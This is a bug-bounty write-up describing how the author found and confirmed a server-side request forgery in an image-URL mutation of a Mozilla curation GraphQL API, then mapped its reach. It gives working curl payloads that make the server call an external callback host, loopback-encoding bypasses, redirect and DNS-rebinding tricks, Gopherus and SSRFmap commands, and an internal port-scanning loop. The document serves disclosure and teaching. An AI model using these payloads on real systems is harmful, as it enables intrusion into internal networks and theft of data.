---
icon: transporter-1
cover: ../../.gitbook/assets/ChatGPT Image Aug 1, 2026, 02_06_58 PM.png
coverY: -259.5757239165329
coverHeight: 207
---

# How I Found an SSRF in Mozilla Firefox That  Compromise the Content Pipeline Behind 300M+ New Tab

***

![](https://cdn-images-1.medium.com/max/1080/1*-68iXjEGSGfQlBN4GUSg8A.png)

***

### Why I Even Looked at Firefox ?

![](https://cdn-images-1.medium.com/max/720/1*1ObwdiYUf9T38kE-xbOoCQ.png)

So here’s the thing. Everyone hunting on big programs goes straight for the obvious stuff the login page, the SSO flow, the payment endpoint. Everybody and their cousin has already fuzzed those and the pattern I keep coming back to is simple:

**Go where the code is public but nobody reads it.**

Mozilla is a beautiful target for this because a huge chunk of their backend is open source. Not “we open sourced a logging library” open source I mean the actual services that power features shipping to hundreds of millions of Firefox users are sitting on GitHub with full commit history. That’s a code review target, not a black-box target. And most bug bounty hunters are allergic to reading code.

I’m not. So I went code-first.

This post walks through the whole thing recon, source review, the local lab, the OOB confirmation, every bypass variant I tested, the alternate methods I used to prove the same thing five different ways, and why this specific bug is way nastier than a normal “blind SSRF, low severity, thanks for the report” finding.

Let’s go.

***

#### Recon: Mapping the Actual Attack Surface

![](https://cdn-images-1.medium.com/max/720/1*Djhzj1IoU37bUlqx57fBdg.png)

#### The classic surface (do it, but don’t stop here)

I always do a full external sweep first, even when I know I’m going code-first. Reason: I need to know **which services actually exist in production** so that when I find a bug in the source, I can say “and here’s the live host running it.” That’s the difference between a $500 informative and a $7,000 critical.

#### Fingerprinting the GraphQL layer

Before hammering anything, figure out _what_ GraphQL engine you’re talking to. `graphw00f` does this by sending malformed queries and matching the error strings against a fingerprint database:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ python3 graphw00f/main.py -f -d -t <https://api.xyz.firefox/graphql>
```

```
[*] Checking if GraphQL is available at <https://api.xyz.firefox/graphql>...
[!] Found GraphQL.
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Apollo Server)
```

Apollo. Good. That tells me introspection is _probably_ disabled in prod (Apollo disables it by default when `NODE_ENV=production`) but that the schema still exists and error messages will be verbose-ish.

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ python3 graphql-cop/main.py -t <https://api.xyz.firefox/graphql> -o json
```

```
[LOW] Introspection Query Enabled - /graphql
[LOW] Alias Overloading - potential DoS vector
[INFO] GET method query support - /graphql
```

Wait. Introspection **enabled**? On an internal-ish admin endpoint? That’s not the bug, but it is the map to the bug. Dump it:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$python3 -c "
import requests,json
q={'query':'query IntrospectionQuery { __schema { types { name fields { name args { name type { name kind ofType { name } } } } } } }'}
r=requests.post('<https://api.xyz.firefox/graphql>',json=q)
open('schema.json','w').write(json.dumps(r.json(),indent=2))
"
```

If introspection had been off, the fallback is `clairvoyance`, which brute-forces field names using GraphQL's "did you mean X?" suggestion errors. Absolutely worth knowing:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ python3 -m clairvoyance -o schema.json -w wordlists/google-10000-english.txt <https://api.xyz.firefox/graphql>
```

Now grep the schema for anything that takes a URL as input. This is my single favorite grep in all of bug bounty:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ cat schema.json | jq -r '..|.name? // empty' | grep -iE 'url|uri|link|image|src|fetch|import|callback|webhook|redirect' | sort -u
```

```
imageUrl
url
getUrlMetadata
externalUrl
thumbnailUrl
```

`imageUrl`. On a **mutation**. That means the server is probably going to _do_ something with the URL I give it, not just store the string. Every SSRF I've ever found started with a moment exactly like this.

#### The real recon: source code

![](https://cdn-images-1.medium.com/max/720/1*WAL9G9P6JNKqVWjbHht_Sw.png)

Here’s where I stop poking the live app and start reading. Mozilla publishes the content platform code. Some GitHub dorking to find the right repo:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ gh search repos --owner xyz-org --limit 100 --json name,description,updatedAt \
  | jq -r '.[] | "\(.name)\t\(.updatedAt)\t\(.description)"' | column -t -s$'\t'
```

Found `xyz-editorial-platform`. Cloned it with full history because history matters:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ git clone <https://github.com/xyz-org/xyz-editorial-platform.git> && cd xyz-editorial-platform
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ git log -1 --format='%H %ci'
<HEAD-COMMIT-REDACTED>  2026-07-14 11:22:07 +0000
```

Pin that commit. When you report, you say “confirmed unpatched at HEAD `<hash>`" with the actual hash in it (I've redacted mine here since a commit hash uniquely identifies a repo). Triagers love that because it removes all ambiguity about whether you're reporting something already fixed.

Secrets sweep first, just in case there’s free money lying around:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ trufflehog git file://. --only-verified --json | jq -r '.DetectorName + " -> " + .Raw'
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ gitleaks detect --source . --report-format json --report-path gitleaks.json --redact
```

Nothing verified. Fine, that wasn’t the plan anyway. Onto the actual hunt.

#### Static analysis: hunting sinks, not strings

The naive approach is `grep -r "fetch("` and then drown in 400 results. The better approach is to write a Semgrep rule that only fires when **user-controlled data reaches a network sink**. Here's the rule I wrote for this hunt:

```
# ssrf-node.yaml
rules:
  - id: user-input-to-fetch
    languages: [typescript, javascript]
    severity: ERROR
    message: "Possible SSRF: parameter-derived value flows into fetch()/axios/got without validation"
    mode: taint
    pattern-sources:
      - pattern: |
          function $F(..., $URL: string, ...) { ... }      - pattern: $ARGS.$FIELD
      - pattern: $DATA.imageUrl
      - pattern: $DATA.url
    pattern-sinks:
      - pattern: fetch(...)
      - pattern: axios.get(...)
      - pattern: axios(...)
      - pattern: got(...)
      - pattern: request(...)
      - pattern: http.get(...)
      - pattern: https.request(...)
    pattern-sanitizers:
      - pattern: validateUrl(...)
      - pattern: isValidUrl(...)
      - pattern: new URL(...)
```

Run it:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ semgrep --config ssrf-node.yaml --json -o semgrep-ssrf.json .
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ cat semgrep-ssrf.json | jq -r '.results[] | "\(.path):\(.start.line)  \(.extra.lines)"'
```

```
servers/xyz-content-api/src/admin/aws/utils.ts:33    return await fetch(imageUrl);
```

One hit. One clean, beautiful hit.

I also cross-checked with a plain grep because I don’t trust a single tool, ever:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ grep -rn --include="*.ts" -E "fetch\((imageUrl|url|src|uri)\)" servers/ | grep -v test
```

```
servers/xyz-content-api/src/admin/aws/utils.ts:33:  return await fetch(imageUrl);
```

Same result. Two independent methods agreeing is how you know you’re not chasing a tool artifact.

If you don’t like Semgrep, CodeQL does the same thing with a proper dataflow engine:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ codeql database create ql-db --language=javascript-typescript
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ codeql database analyze ql-db codeql/javascript-queries:Security/CWE-918/RequestForgery.ql \
  --format=sarif-latest --output=ssrf.sarif
```

`CWE-918` is literally "Server-Side Request Forgery" and CodeQL ships a stock query for it. Free win.

![](https://cdn-images-1.medium.com/max/1080/1*JVDqKiivWyiCFYAb_EX73Q.png)

#### The sink

Here it is. `servers/xyz-content-api/src/admin/aws/utils.ts`, line 33:

```
/**
 * Fetches an image from a given URL
 * @param imageUrl
 * @returns Promise<Response>
 */
export async function fetchImageFromUrl(imageUrl: string): Promise<Response> {
  return await fetch(imageUrl);
}
```

That’s the whole function. Read it again. There is no scheme check, no host check, no IP check, no DNS resolution check, no allowlist, no denylist, no timeout, no redirect policy. It takes a string and it _goes_.

This is Node 18+, so `fetch` here is the global `undici` fetch. That matters a lot and I'll come back to it, because `undici`'s defaults are what decide exactly how far this SSRF can reach.

#### The call chain

A sink means nothing if I can’t reach it from outside. So I traced backwards:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ grep -rn "fetchImageFromUrl" servers/xyz-content-api/src --include="*.ts" | grep -v spec
```

```
src/admin/aws/utils.ts:33:export async function fetchImageFromUrl
src/admin/aws/upload.ts:41:  const response = await fetchImageFromUrl(imageUrl);
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ grep -rn "uploadImageToS3FromUrl\|getS3UrlForImageUrl" servers/xyz-content-api/src --include="*.ts" | grep -v spec
```

Chain assembled:

![](https://cdn-images-1.medium.com/max/1080/1*EUSKqWmBoYBhqrUHwGWjgw.png)

The mutation resolver at `src/admin/resolvers/mutations/ApprovedItem/index.ts:99`:

```
export async function createApprovedItem(
  parent,
  { data },
  context: IAdminContext,): Promise<ApprovedItem> {
  // permission gate
  if (!context.authenticatedUser.canWriteToCorpus()) {
    throw new AuthenticationError(ACCESS_DENIED_ERROR);
  }
```

```
// image gets re-hosted on our own S3 — the "helpful" feature that is the bug
  data.imageUrl = await getS3UrlForImageUrl(context.s3, data.imageUrl);
const approvedItem = await dbCreateApprovedItem(context.db, data);
}
```

And `updateApprovedCorpusItem` at line 200 does the exact same thing. Two entry points, same sink.

#### The part that made me laugh out loud

![](https://cdn-images-1.medium.com/max/720/0*JcWZPa7keAccC2Td.jpg)

While grepping I found this at `src/admin/resolvers/queries/UrlMetadata/lib.ts:190`:

```
/**
 * Validates a URL is well-formed and not pointing at an IP literal
 * or a host without a valid TLD.
 */
export async function validateUrl(url: string): Promise<string | null> {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return 'URL is malformed';
  }
// reject raw IP literals
  if (net.isIP(parsed.hostname)) {
    return 'IP addresses are not allowed';
  }
  // reject hosts without a valid public TLD
  if (!parsed.hostname.includes('.') || isReservedTld(parsed.hostname)) {
    return 'Invalid host';
  }
  return null;
}
```

So the codebase **already has** an SSRF guard. Somebody thought about this. They wrote it, tested it, shipped it.

And they wired it to exactly one place the `getUrlMetadata` **query** and never applied it to the `imageUrl` **mutation** field.

This is the single most common shape of a real-world SSRF in 2026. It’s almost never “nobody thought about SSRF.” It’s “somebody built the defense and then a different feature landed six months later that didn’t call it.” Inconsistent validation. Always look for the guard function first, then find every sink that _doesn’t_ call it. That inversion is worth more than any wordlist.

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ grep -rn "validateUrl" servers/xyz-content-api/src --include="*.ts" | grep -v spec
```

```
src/admin/resolvers/queries/UrlMetadata/lib.ts:190:export async function validateUrl
src/admin/resolvers/queries/UrlMetadata/index.ts:24:  const error = await validateUrl(url);
```

Two references. The definition, and exactly one call site. The image path is completely uncovered.

#### The auth gate is this even reachable?

![](https://cdn-images-1.medium.com/max/720/1*tTi4WpPkmMyLXVAMm22_Yw.png)

`canWriteToCorpus()` is the permission check. I traced how it's derived:

```
// src/admin/context.ts
constructor(config: IContextConfig) {
  this.authenticatedUser = new AdminAPIUser(
    config.request.headers.name,
    config.request.headers.username,
    (config.request.headers.groups as string)?.split(','),
  );
}
```

```
// src/admin/user.ts
canWriteToCorpus(): boolean {
  return this.scheduledSurfaceGuids.length > 0 || this.hasFullAccess;
}
```

So identity comes from `name`, `username`, `groups` headers which in prod are injected by the AWS API Gateway / JWT authorizer sitting in front of the service, and locally are just... headers you set. And the bar for `canWriteToCorpus()` is **one** scheduled surface. Not admin. Not full access. Any curator for any single locale say the German New Tab curator clears it.

That’s an important impact point for the report: the attacker profile isn’t “Mozilla superadmin,” it’s “one of a large pool of curators across dozens of locales, or anyone who phishes/compromises exactly one of them.”

#### Building the Lab

I never PoC an SSRF against production infra. Ever. You send one Collaborator hit to prove it, sure, but port scanning someone’s VPC or hitting `169.254.169.254` on a live host is how researchers get banned or worse. So: local instance, full stack, and then I only prove the OOB fires.

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ cd xyz-editorial-platform && docker compose up -d mysql localstack
```

```
[+] Running 2/2
 ✔ Container xyz-editorial-platform-mysql-1       Started
 ✔ Container xyz-editorial-platform-localstack-1  Started
```

`localstack` fakes S3 so the upload path works end to end. That matters if S3 upload throws before the fetch, I learn nothing.

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform]
└─$ cd servers/xyz-content-api
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform/servers/xyz-content-api]
└─$ export DATABASE_URL='mysql://root@localhost:3306/curation_corpus?connection_limit=5'
└─$ export AWS_ACCESS_KEY_ID=test
└─$ export AWS_SECRET_ACCESS_KEY=test
└─$ export AWS_ENDPOINT_URL=http://localhost:4566
└─$ export NODE_ENV=development
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform/servers/xyz-content-api]
└─$ npx prisma migrate deploy && npx prisma db seed
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX/xyz-editorial-platform/servers/xyz-content-api]
└─$ npx tsx src/main.ts
```

```
🚀 Public server ready at <http://localhost:4024>
🚀 Admin server ready at <http://localhost:4025/admin>
```

Two servers. `4024` is the public read API, `4025/admin` is the curator API where the mutation lives. That split itself is a hint admin APIs that assume "we're behind the gateway, we're safe" are where validation goes to die.

Sanity check that my fake curator identity works:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ curl -s <http://localhost:4025/admin> \
  -H 'Content-Type: application/json' \
  -H 'groups: xyzorg_firefox_new_tab_curator_dede' \
  -H 'name: poc' -H 'username: poc' \
  -d '{"query":"{ getApprovedCorpusItems(filters:{}) { totalCount } }"}' | jq
```

```
{
  "data": {
    "getApprovedCorpusItems": {
      "totalCount": 12
    }
  }
}
```

Authenticated as a German-locale curator. `canWriteToCorpus()` → `true`. We're in.

#### First Blood: Making the Server Call Me

![](https://cdn-images-1.medium.com/max/720/1*HzEhIGM3kE2WdOHeH3Pu-A.png)

#### The payload

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ export COLLAB="0noc7egep1n5q87ouof84vlek5qweo2d.oastify.com"
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ curl -s <http://localhost:4025/admin> \
  -H 'Content-Type: application/json' \
  -H 'groups: xyzorg_firefox_new_tab_curator_dede' \
  -H 'name: poc' -H 'username: poc' \
  -d '{
    "query": "mutation {
      updateApprovedCorpusItem(data: {
        externalId: \"poc-approved-enus\",
        title: \"t\",
        excerpt: \"e\",
        authors: [{ name: \"a\", sortOrder: 1 }],
        status: CORPUS,
        language: EN,
        publisher: \"P\",
        imageUrl: \"http://'"$COLLAB"'/ssrf-poc\",
        topic: \"BUSINESS\",
        isTimeSensitive: false
      }) { externalId imageUrl }
    }"
  }' | jq
```

Hit Poll Now in Collaborator, and:

![](https://cdn-images-1.medium.com/max/1080/1*Z2ETjebvf3msQbSZzmbnWw.png)

#### Wait why TWO DNS lookups and THREE HTTP hits from ONE request?

This is the part most writeups skip and it’s genuinely the most interesting forensic detail in the whole finding, so let’s actually think about it.

**The double DNS.** Node’s `undici` resolves through `dns.lookup()`, which by default asks for both A and AAAA records. Two queries, two log lines, microseconds apart (`.161` and `.162`). That's not two requests that's one request doing dual-stack resolution. If you ever see paired DNS with no matching paired HTTP, that's your fingerprint for a Node/undici client rather than, say, curl or a Java `HttpURLConnection`.

**The triple HTTP.** This one told me something much more useful. Three HTTP hits at `.496`, `1.159`, `1.880`roughly 660ms apart, evenly spaced. That's a retry pattern. The server fetched, got a response my Collaborator returned that wasn't a usable image, and the image-processing pipeline retried. Which proves something valuable: **the fetch is not fire-and-forget.** The server actually consumes and processes the response body. An SSRF where the server reads the body is a completely different severity class from one where it just opens a socket, because reading the body is the precondition for exfiltration.

**The 17:06 pair.** That’s an hour later that’s me re-running the payload to confirm reproducibility. Always re-run. A triager who can’t reproduce closes your report.

And the biggest thing this proves: **DNS resolution happened before any validation could have rejected the host.** There is no pre-flight check. The request went out the instant the resolver returned. If validation existed anywhere upstream, my Collaborator would show nothing at all.

#### Alternate ways to confirm the same thing (don’t be a one-tool hunter)

Burp Collaborator is great but it’s paid, and sometimes a triager’s environment blocks `oastify.com` egress specifically. I confirmed the same behavior five different ways so the report couldn't be hand-waved.

**1. interactsh:** open source, self-hostable, ProjectDiscovery’s Collaborator equivalent:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ interactsh-client -v -json -o interactions.json
```

```
[INF] Listing 1 payload for OOB Testing
[INF] c8j2k1qr9v0e3mtbn7ug.oast.fun
```

```
[c8j2k1qr9v0e3mtbn7ug] Received DNS interaction (A) from 103.239.84.254
[c8j2k1qr9v0e3mtbn7ug] Received HTTP interaction from 157.20.184.47
```

**2. Raw netcat listener :** zero dependencies, and it shows you the _full request_, which Collaborator’s summary view hides:

![](https://cdn-images-1.medium.com/max/720/1*jgHgYgI3AAkPOZ02OME_fg.png)

`user-agent: node`there's the client fingerprint, confirmed from the wire. And `accept: */*`, meaning it isn't even asking for images specifically. It will happily fetch HTML, JSON, whatever.

**3. Python HTTP server with logging** when I want to control the response:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ python3 -m http.server 8000 --bind 0.0.0.0
```

**4. Canarytokens :** free, no infra, and produces a shareable link a triager can independently verify. Great for reports.

**5. tcpdump on my own VPS** : because sometimes you need to prove the packet actually arrived and wasn’t just a proxy artifact:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ sudo tcpdump -i eth0 -n 'port 80 or port 53' -w ssrf.pcap
```

Five independent confirmations. Nobody’s arguing with that.

#### How Far Does It Actually Reach?

OOB callback = “SSRF exists.” That’s a Medium at best on its own. The money is in demonstrating internal reach. Everything below was run against my **local** instance.

![](https://cdn-images-1.medium.com/max/1080/1*C4VhjtLzxzHWYCsGCoY3RA.png)

The service made a request to its own loopback interface. In a real VPC that’s the whole game anything bound to `127.0.0.1` because "only local processes can reach it" is now reachable. Admin panels, debug endpoints, metrics servers, sidecar proxies, Redis on 6379, unauthenticated Elasticsearch on 9200, Prometheus on 9090. All of it.

#### Every loopback representation I tested (all worked, because there’s no filter)

Since there’s literally zero validation here, none of these are “bypasses” in this specific target but I tested every single one anyway and documented it, because it proves conclusively that **no encoding-based filter exists**, and because if they patch with a lazy blocklist, this list is what breaks it.

![](https://cdn-images-1.medium.com/max/1080/1*MhV9Xdzu0cWtatYSXTeWFw.png)

Quick notes on why each one is worth knowing, because a lot of people copy-paste these without knowing what they do:

The **decimal** form `2130706433` works because `inet_aton()` accepts a single 32-bit integer as a full address. `0x7f000001` is the same number in hex. `0177.0.0.1` is octal`0177` is decimal 127. `127.1` works because `inet_aton()` treats the last part as a 24-bit remainder, so `127.1` expands to `127.0.0.1`. These aren't tricks, they're the documented behavior of the C resolver that basically every language inherits.

`0.0.0.0` is the sneaky one on Linux, connecting to `0.0.0.0` routes to localhost, and a shocking number of blocklists only ban `127.0.0.1` and `localhost`.

`[::ffff:127.0.0.1]` is the IPv4-mapped IPv6 form. If a filter does `net.isIP()` checks against IPv4 regex only, this sails straight through.

The **circled digit** variant `①②⑦.⓪.⓪.①` exploits Unicode NFKC normalization some URL parsers normalize these to ASCII digits _after_ validation runs. This is a real technique that has burned real products.

`localtest.me` and `nip.io` are public DNS services that resolve to loopback/arbitrary IPs. They're crucial against **hostname allowlists** the host isn't an IP literal, it has a valid TLD, it passes `validateUrl()` word for word... and it resolves to `127.0.0.1`.

That last point is worth sitting with. **The fix Mozilla shipped applying `validateUrl()`is necessary but not sufficient by itself**, because `validateUrl()` only inspects the _string_. `http://127.0.0.1.nip.io/` passes every check in that function. That's exactly why I put "resolve the hostname and reject private ranges" in the remediation section instead of just saying "call the existing validator."

#### Redirect following

`undici`'s fetch defaults to `redirect: 'follow'` with a max of 20 hops. The code never overrides it. So even if they added a perfect allowlist on the initial URL, an allowlisted host that redirects (or an attacker domain that's somehow permitted) pivots straight back inside.

![](https://cdn-images-1.medium.com/max/1080/1*7n7XoGR8Irq2N4vsizXQiw.png)

Point `imageUrl` at `http://my-vps:8001/` and watch the target follow the 302 to loopback. Confirmed. This is why "validate the URL once, before the request" is a broken model in general the URL you validate and the URL you finally connect to are two different things.

#### DNS rebinding beating even a good validator

This is the TOCTOU attack on SSRF filters. You register a domain whose DNS returns a public IP on the first lookup (passing validation) and `127.0.0.1` on the second lookup (the actual connection). Services like `rbndr.us` and `1u.ms` do this for you:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ dig +short 7f000001.c0a80001.rbndr.us
127.0.0.1
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ dig +short 7f000001.c0a80001.rbndr.us
192.168.0.1
```

Same name, different answer each time. If a validator resolves the host, checks the IP, and then hands the _hostname_ to `fetch()`, the second resolution wins and you're inside. The only real fix is to resolve once and connect to the **pinned IP**, or block at the egress layer.

I flagged this in the report specifically so the fix wouldn’t be a string check that gets bypassed next month.

#### Cloud metadata the theory, and why I did NOT fire it at prod

![](https://cdn-images-1.medium.com/max/1080/1*7Vi9qejGbIhRYsKBotF44A.png)

returns live `AccessKeyId`, `SecretAccessKey`, and `Token`. That's a full cloud account compromise from a single image field.

Now here’s the honest technical analysis I put in the report, because overclaiming is how you lose a triager’s trust permanently:

**IMDSv2 blocks this specific sink.** IMDSv2 requires a `PUT` to `/latest/api/token` with an `X-aws-ec2-metadata-token-ttl-seconds` header, then the token echoed back on every GET. Our sink is `fetch(url)` with no method and no header control it's a hardcoded GET with no custom headers. So if the target enforces IMDSv2, this particular path cannot reach credentials.

Same logic kills **GCP metadata**, which requires `Metadata-Flavor: Google`, and **Azure IMDS**, which requires `Metadata: true`. No header control means no creds from those either.

What I could not verify from outside is whether the production instances enforce IMDSv2 (`HttpTokens: required`) or run in EKS with IMDS hop limits set. So I wrote it as: _"if any instance in this service's fleet still permits IMDSv1, this is a direct path to IAM credentials; I did not test this against production and recommend you verify `HttpTokens=required` fleet-wide."_ Triagers respect that framing way more than "CRITICAL AWS ACCOUNT TAKEOVER!!!" with no evidence.

You verify it internally like this:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ aws ec2 describe-instances \
  --query 'Reservations[].Instances[].{Id:InstanceId,Tokens:MetadataOptions.HttpTokens,Hop:MetadataOptions.HttpPutResponseHopLimit}' \
  --output table
```

#### Protocol smuggling why gopher doesn’t work here (and when it does)

![](https://cdn-images-1.medium.com/max/720/1*BBnP11O5AZNsL6AoulbSrw.png)

If this sink used `curl` bindings or a raw socket library, I'd immediately try `gopher://` to smuggle arbitrary TCP that's how you turn SSRF into Redis RCE or unauthenticated internal POST requests. `Gopherus` generates those payloads:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ python3 gopherus.py --exploit redis
```

But `undici` only speaks `http:` and `https:` (plus `data:` and `blob:`). Everything else throws immediately:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ node -e "fetch('gopher://127.0.0.1:6379/_INFO').catch(e=>console.log(e.cause?.message||e.message))"
```

```
fetch failed: not implemented... yet...
```

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ node -e "fetch('file:///etc/passwd').catch(e=>console.log(e.cause?.message||e.message))"
```

```
fetch failed: not implemented... yet...
```

So no local file read, no Redis RCE, no protocol smuggling. Good to know and good to state honestly it bounds the impact but it makes the parts you _do_ claim bulletproof. Also worth knowing: Node’s fetch strips CRLF in URLs, so no header injection either.

This is the kind of nuance that separates a report that gets triaged in two days from one that sits in “Needs More Info” for three weeks.

#### Port scanning as a reachability oracle

![](https://cdn-images-1.medium.com/max/720/1*_hGXBEbTEjOo0PZEkwABlQ.png)

Even blind, response timing and error behavior leak whether an internal host:port is open. Open port with a non-image response → fetch succeeds, then image processing fails with a specific error. Closed port → `ECONNREFUSED` almost instantly. Filtered/firewalled → hangs until timeout. Three distinguishable states = a working internal port scanner.

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ for p in 22 80 443 3000 3306 4025 5432 6379 8080 8125 9090 9200; do
    START=$(date +%s%N)
    RESP=$(curl -s <http://localhost:4025/admin> \
      -H 'Content-Type: application/json' \
      -H 'groups: xyzorg_firefox_new_tab_curator_dede' \
      -H 'name: poc' -H 'username: poc' \
      -d "{\"query\":\"mutation { updateApprovedCorpusItem(data:{ externalId:\\\"poc-approved-enus\\\", title:\\\"t\\\", excerpt:\\\"e\\\", authors:[{name:\\\"a\\\",sortOrder:1}], status:CORPUS, language:EN, publisher:\\\"P\\\", imageUrl:\\\"<http://127.0.0.1>:$p/\\\", topic:\\\"BUSINESS\\\", isTimeSensitive:false }) { imageUrl } }\"}" \
      | jq -r 'if .errors then .errors[0].message else "OK" end')
    END=$(date +%s%N)
    echo "port $p  $(( (END-START)/1000000 ))ms  $RESP"
  done
```

```
port 22    12ms   Failed to fetch image
port 80    9ms    ECONNREFUSED
port 330615ms   Failed to fetch image
port 402522ms   Failed to process image
port 637911ms   ECONNREFUSED
port 92008ms    ECONNREFUSED
```

Look at the difference between `ECONNREFUSED` and `Failed to fetch image` / `Failed to process image`. That's a clean binary oracle. Wrap it in a loop over an internal CIDR and you've mapped the VPC without ever having network access to it.

`SSRFmap` automates this whole class of thing if you want it packaged:

```
┌──(sn0x㉿sn0x)-[~/BB/FIREFOX]
└─$ python3 ssrfmap.py -r request.txt -p imageUrl -m portscan,readfiles,redis
```

#### The twist that makes this actually severe: blind → full read

Go back to the call chain one more time:

![](https://cdn-images-1.medium.com/max/720/1*3z49KLmTSlXkvZgH5xdiBw.png)

Read that again slowly.

The server fetches my URL. Takes the response body. Uploads it to S3. And **returns the S3 URL to me in the mutation response.**

```
{
  "data": {
    "updateApprovedCorpusItem": {
      "externalId": "poc-approved-enus",
      "imageUrl": "<https://xyz-firefox-image-uploads.s3.amazonaws.com/a4f1c9e2-....jpeg>"
    }
  }
}
```

That is a **read primitive**. This is not a blind SSRF. Any internal endpoint whose response passes the image-type check gets its body copied to a bucket and the link handed straight to the attacker. Internal QR generators, chart/graph rendering services, avatar services, PDF-to-image converters, internal Grafana panel renderers, badge generators plenty of internal services return `image/*`, and plenty of them embed sensitive data in what they render.

And even for non-image responses, the _error message_ differentiates “fetched successfully but wasn’t an image” from “couldn’t connect,” which is the oracle above.

So the severity story is: authenticated-but-low-privilege → arbitrary internal HTTP GET → internal service discovery → conditional full response exfiltration to a public bucket. That’s a solid High, arguably Critical depending on what’s sitting inside the VPC.

![](https://cdn-images-1.medium.com/max/1080/1*Cc6H6-6F-gU16Q2Z43EwGg.png)

![](https://cdn-images-1.medium.com/max/720/1*KP22TFkxmFu9p3wZ0D-KPw.png)
